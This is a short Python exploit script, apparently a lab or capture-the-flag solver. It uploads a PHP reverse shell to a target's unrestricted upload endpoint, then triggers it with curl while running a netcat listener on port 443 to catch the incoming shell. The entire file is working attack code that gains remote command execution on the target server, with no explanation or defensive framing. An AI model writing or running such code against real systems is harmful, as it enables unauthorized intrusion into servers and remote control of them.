import sys
import requests
import os

def cmd_args(func):
    def wrapper():
        return func(sys.argv[1], sys.argv[2])

    return wrapper

@cmd_args
def run(ip=None, _id=None):
	files1 = {'filename': open('php-reverse-shell.php', 'rb')}
	response1 = requests.post(f"http://{ip}/test/uploadScript.php", files=files1)

	if os.system(f"sleep 1 & curl http://{ip}/test/upload/php-reverse-shell.php & nc -lvn 443") == 0:
		return 1
	else: return 0


print(run())